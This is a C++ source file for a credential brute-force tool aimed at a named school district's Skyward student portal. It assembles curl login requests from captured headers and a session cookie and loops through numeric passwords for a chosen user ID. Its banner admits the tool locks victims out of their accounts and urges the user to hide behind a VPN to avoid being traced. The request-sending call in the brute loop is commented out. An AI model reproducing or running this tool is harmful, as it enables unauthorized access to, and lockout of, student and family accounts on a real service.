#include <iostream>
#include <string>

std::string username;
int sends = 0;

void custom_password() {
    // Password stuff
    std::string password_str;
    std::string command = "curl \"https://skyward.scps.k12.fl.us/scripts/wsisa.dll/WService=wsEAplus/skyporthttp.w\" -X POST -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0\" -H \"Accept: */*\" -H \"Accept-Language: en-US,en;q=0.5\" -H \"Referer: https://skyward.scps.k12.fl.us/scripts/wsisa.dll/WService=wsEAplus/fwemnu01.w/\" -H \"Content-Type: application/x-www-form-urlencoded\" -H \"Origin: https://skyward.scps.k12.fl.us\" -H \"Connection: keep-alive\" -H \"Cookie: lhnContact=cac219c2-7713-4644-b5f1-03d32b7996b1-38502-MZFrgvS\" -H \"Sec-Fetch-Dest: empty\" -H \"Sec-Fetch-Mode: cors\" -H \"Sec-Fetch-Site: same-origin\" -H \"DNT: 1\" -H \"Sec-GPC: 1\" -H \"TE: trailers\" --data-raw \"requestAction=eel&method=extrainfo&codeType=tryLogin&codeValue=";

    std::cout << "Enter your password: ";
    std::cin >> password_str;

    std::cout << "Username = " << ::username << "\n";
    std::cout << "Password = " << password_str << "\n";

    command = command.append(username);
    command = command.append("&hCompName=ESC-AW-SKYWEB01&hOSName=Windows\"%\"20NT&login=");
    command = command.append(username);
    command = command.append("&password=");
    command = command.append(password_str);
    command = command.append("&SecurityMenuID=0&HomePageMenuID=0&nameid=-1&hNavSearchOption=all&hSecCache=0\"%\"20items\"%\"20in\"%\"200\"%\"20entities&CurrentProgram=skyportlogin.w&CurrentVersion=010182&SuperVersion=012121&PaCVersion=05.21.06.00.08&Browser=Moz&BrowserVersion=92&BrowserPlatform=Win32&TouchDevice=false&noheader=yes&duserid=-1&hIPInfo=10.1.208.55&HomePage=sepadm01.w&loginID=-1&hUseCGIIP=yes&hScrollBarWidth=17&UserSecLevel=5&UserLookupLevel=5&AllowSpecial=false&hAnon=bjlbYpAByijcxUsV&pState=FL&pCountry=US&hDisplayBorder=true&hAlternateColors=true&screenWidth=1920&screenHeight=1080&hforgotLoginPage=fwemnu01&userAgent=Mozilla\"%\"2F5.0\"%\"20(Windows\"%\"20NT\"%\"2010.0\"%\"3B\"%\"20Win64\"%\"3B\"%\"20x64\"%\"3B\"%\"20rv\"%\"3A92.0)\"%\"20Gecko\"%\"2F20100101\"%\"20Firefox\"%\"2F92.0&osName=Windows\"%\"2010&brwsInfo=Firefox\"%\"2092&subversion=92&supported=true&pageused=Desktop&recordLimit=30&disableAnimations=yes&hOpenSave=no&hAutoOpenPref=no&hButtonHotKeyIDs=bCancel&hButtonHotKeys=B&hLoadTime=.016&lip=4608313c-a9d4-4c8b-a8dd-3cb95047849e.local&cUserRole=family\"%\"2Fstudent&fwtimestamp=1632529538408\"");

    const char* char_command = command.c_str();

    std::cout << char_command << "\n";

    system(char_command);
    exit(0);
}

void brute_password(int password_str) {
    std::string command = "curl \"https://skyward.scps.k12.fl.us/scripts/wsisa.dll/WService=wsEAplus/skyporthttp.w\" -X POST -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0\" -H \"Accept: */*\" -H \"Accept-Language: en-US,en;q=0.5\" -H \"Referer: https://skyward.scps.k12.fl.us/scripts/wsisa.dll/WService=wsEAplus/fwemnu01.w/\" -H \"Content-Type: application/x-www-form-urlencoded\" -H \"Origin: https://skyward.scps.k12.fl.us\" -H \"Connection: keep-alive\" -H \"Cookie: lhnContact=cac219c2-7713-4644-b5f1-03d32b7996b1-38502-MZFrgvS\" -H \"Sec-Fetch-Dest: empty\" -H \"Sec-Fetch-Mode: cors\" -H \"Sec-Fetch-Site: same-origin\" -H \"DNT: 1\" -H \"Sec-GPC: 1\" -H \"TE: trailers\" --data-raw \"requestAction=eel&method=extrainfo&codeType=tryLogin&codeValue=";

    std::string password = std::to_string(password_str);

    std::cout << "Username = " << ::username << "\n";
    std::cout << "Password = " << password_str << "\n";

    command = command.append(username);
    command = command.append("&hCompName=ESC-AW-SKYWEB01&hOSName=Windows\"%\"20NT&login=");
    command = command.append(username);
    command = command.append("&password=");
    command = command.append(password);
    command = command.append("&SecurityMenuID=0&HomePageMenuID=0&nameid=-1&hNavSearchOption=all&hSecCache=0\"%\"20items\"%\"20in\"%\"200\"%\"20entities&CurrentProgram=skyportlogin.w&CurrentVersion=010182&SuperVersion=012121&PaCVersion=05.21.06.00.08&Browser=Moz&BrowserVersion=92&BrowserPlatform=Win32&TouchDevice=false&noheader=yes&duserid=-1&hIPInfo=10.1.208.55&HomePage=sepadm01.w&loginID=-1&hUseCGIIP=yes&hScrollBarWidth=17&UserSecLevel=5&UserLookupLevel=5&AllowSpecial=false&hAnon=bjlbYpAByijcxUsV&pState=FL&pCountry=US&hDisplayBorder=true&hAlternateColors=true&screenWidth=1920&screenHeight=1080&hforgotLoginPage=fwemnu01&userAgent=Mozilla\"%\"2F5.0\"%\"20(Windows\"%\"20NT\"%\"2010.0\"%\"3B\"%\"20Win64\"%\"3B\"%\"20x64\"%\"3B\"%\"20rv\"%\"3A92.0)\"%\"20Gecko\"%\"2F20100101\"%\"20Firefox\"%\"2F92.0&osName=Windows\"%\"2010&brwsInfo=Firefox\"%\"2092&subversion=92&supported=true&pageused=Desktop&recordLimit=30&disableAnimations=yes&hOpenSave=no&hAutoOpenPref=no&hButtonHotKeyIDs=bCancel&hButtonHotKeys=B&hLoadTime=.016&lip=4608313c-a9d4-4c8b-a8dd-3cb95047849e.local&cUserRole=family\"%\"2Fstudent&fwtimestamp=1632529538408\"");

    const char* char_command = command.c_str();

    // std::cout << char_command << "\n";
    // system(char_command);
}

int main()
{
    std::cout << "  /$$$$$$  /$$                       /$$$$$$$                                /$$\n";
    std::cout << " /$$__  $$| $$                      | $$__  $$                              | $$\n";
    std::cout << "| $$  \\__/| $$   /$$ /$$   /$$      | $$  \\ $$  /$$$$$$   /$$$$$$   /$$$$$$ | $$   /$$\n";
    std::cout << "|  $$$$$$ | $$  /$$/| $$  | $$      | $$$$$$$  /$$__  $$ /$$__  $$ |____  $$| $$  /$$/\n";
    std::cout << " \\____  $$| $$$$$$/ | $$  | $$      | $$__  $$| $$  \\__/| $$$$$$$$  /$$$$$$$| $$$$$$/\n";
    std::cout << " /$$  \\ $$| $$_  $$ | $$  | $$      | $$  \\ $$| $$      | $$_____/ /$$__  $$| $$_  $$\n";
    std::cout << "|  $$$$$$/| $$ \\  $$|  $$$$$$$      | $$$$$$$/| $$      |  $$$$$$$|  $$$$$$$| $$ \\  $$\n";
    std::cout << " \\______/ |__/  \\__/ \\____  $$      |_______/ |__/       \\_______/ \\_______/|__/  \\__/\n";
    std::cout << "                     /$$  | $$\n";
    std::cout << "                    |  $$$$$$/\n";
    std::cout << "                     \\______/\n";
    std::cout << "\n";
    std::cout << "This is an application designed to \"bruteforce\" a Skyward login.\nHowever, it will eventually lock out an account and force the user to contact tech support, locking them out of their account and putting a hitch in their plans, so there's that.";
    std::cout << "\n\n";

    // Initialize variables
    char answer;
    char mode;

    // Grab user input
    std::cout << "Please enter a user I.D (must be a number): ";
    std::cin >> ::username;
    std::cout << "Username entered is " << ::username << "\n";
    std::cout << "Do you want to enter your own password (p) or brute (b)? ";
    std::cin >> mode;
    if (mode == 'p') {
        custom_password();
    }
    std::cout << "Are you SURE you want to continue with this.\nThis is extremely risky and it is HIGHLY recommended you use a VPN or some other proxy as this is easily traceable.\nARE YOU ABSOULTELY SURE (Y/n) ";
    std::cin >> answer;
    if (answer == 'n') {
        exit(0);
    }
    std::cout << "Beginning to send requests... \n";
    while (sends < 1000) {
        std::cout << "Test";
        brute_password(sends);
        sends++;
    }
}

// Dissected cURL request
/*

curl "https://skyward.scps.k12.fl.us/scripts/wsisa.dll/WService=wsEAplus/skyporthttp.w" -X POST
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0"
-H "Accept - Language: en - US, en; q = 0.5"
//--compressed REMOVED due to Windows being absolutely stupid and not updating the cURL package
-H "Referer: https://skyward.scps.k12.fl.us/scripts/wsisa.dll/WService=wsEAplus/fwemnu01.w"
-H "Content-Type: application/x-www-form-urlencoded"
-H "Origin: https://skyward.scps.k12.fl.us"
-H "Connection: keep-alive"
-H "Cookie: lhnContact=cac219c2-7713-4644-b5f1-03d32b7996b1-38502-MZFrgvS"
-H "Sec-Fetch-Dest: empty"
-H "Sec-Fetch-Mode: cors"
-H "Sec-Fetch-Site: same-origin"
-H "DNT: 1"
-H "Sec-GPC: 1"
-H "TE: trailers"
--data-raw      // oh yeah juicy stuff down here
    "requestAction=eel&
    method=extrainfo&
    codeType=tryLogin&
    codeValue=USERNAME&
    hCompName=ESC-AW-SKYWEB01& Company Name? Unsure if this should be changed for anonymity
    hOSName=Windows"%"20NT&
    login=USERNAME&
    password=PASSWORD&
    SecurityMenuID=0&
    HomePageMenuID=0&
    nameid=-1&
    hNavSearchOption=all&
    hSecCache=0"%"20items"%"20in"%"200"%"20entities&
    CurrentProgram=skyportlogin.w&
    CurrentVersion=010182&
    SuperVersion=012121&
    PaCVersion=05.21.06.00.08&
    Browser=Moz&
    BrowserVersion=92&
    BrowserPlatform=Win32&
    TouchDevice=false&
    noheader=yes&
    duserid=-1&
    hIPInfo=10.1.208.55&
    HomePage=sepadm01.w&
    loginID=-1&
    hUseCGIIP=yes&
    hScrollBarWidth=17&
    UserSecLevel=5&
    UserLookupLevel=5&
    AllowSpecial=false&
    hAnon=bjlbYpAByijcxUsV&
    pState=FL&
    pCountry=US&
    hDisplayBorder=true&
    hAlternateColors=true&
    screenWidth=1920&
    screenHeight=1080&
    hforgotLoginPage=fwemnu01&
    userAgent=Mozilla"%"2F5.0"%"20(Windows"%"20NT"%"2010.0"%"3B"%"20Win64"%"3B"%"20x64"%"3B"%"20rv"%"3A92.0)"%"20Gecko"%"2F20100101"%"20Firefox"%"2F92.0&osName=Windows"%"2010&
    brwsInfo=Firefox"%"2092&
    subversion=92&
    supported=true&
    pageused=Desktop&
    recordLimit=30&
    disableAnimations=yes&
    hOpenSave=no&
    hAutoOpenPref=no&
    hButtonHotKeyIDs=bCancel&
    hButtonHotKeys=B&
    hLoadTime=.016&
    lip=4608313c-a9d4-4c8b-a8dd-3cb95047849e.local&
    cUserRole=family"%"2Fstudent&fwtimestamp=1632529538408"
*/

// Un-cleaned curl request:
// curl "https://skyward.scps.k12.fl.us/scripts/wsisa.dll/WService=wsEAplus/skyporthttp.w" - X POST - H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0" - H "Accept: */*" - H "Accept-Language: en-US,en;q=0.5" --compressed - H "Referer: https://skyward.scps.k12.fl.us/scripts/wsisa.dll/WService=wsEAplus/fwemnu01.w" - H "Content-Type: application/x-www-form-urlencoded" - H "Origin: https://skyward.scps.k12.fl.us" - H "Connection: keep-alive" - H "Cookie: lhnContact=cac219c2-7713-4644-b5f1-03d32b7996b1-38502-MZFrgvS" - H "Sec-Fetch-Dest: empty" - H "Sec-Fetch-Mode: cors" - H "Sec-Fetch-Site: same-origin" - H "DNT: 1" - H "Sec-GPC: 1" - H "TE: trailers" --data - raw "requestAction=eel&method=extrainfo&codeType=tryLogin&codeValue=TACO&hCompName=ESC-AW-SKYWEB01&hOSName=Windows" % "20NT&login=TACO&password=SALAD&SecurityMenuID=0&HomePageMenuID=0&nameid=-1&hNavSearchOption=all&hSecCache=0" % "20items" % "20in" % "200" % "20entities&CurrentProgram=skyportlogin.w&CurrentVersion=010182&SuperVersion=012121&PaCVersion=05.21.06.00.08&Browser=Moz&BrowserVersion=92&BrowserPlatform=Win32&TouchDevice=false&noheader=yes&duserid=-1&hIPInfo=10.1.208.55&HomePage=sepadm01.w&loginID=-1&hUseCGIIP=yes&hScrollBarWidth=17&UserSecLevel=5&UserLookupLevel=5&AllowSpecial=false&hAnon=bjlbYpAByijcxUsV&pState=FL&pCountry=US&hDisplayBorder=true&hAlternateColors=true&screenWidth=1920&screenHeight=1080&hforgotLoginPage=fwemnu01&userAgent=Mozilla" % "2F5.0" % "20(Windows" % "20NT" % "2010.0" % "3B" % "20Win64" % "3B" % "20x64" % "3B" % "20rv" % "3A92.0)" % "20Gecko" % "2F20100101" % "20Firefox" % "2F92.0&osName=Windows" % "2010&brwsInfo=Firefox" % "2092&subversion=92&supported=true&pageused=Desktop&recordLimit=30&disableAnimations=yes&hOpenSave=no&hAutoOpenPref=no&hButtonHotKeyIDs=bCancel&hButtonHotKeys=B&hLoadTime=.016&lip=4608313c-a9d4-4c8b-a8dd-3cb95047849e.local&cUserRole=family" % "2Fstudent&fwtimestamp=1632529538408"

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu
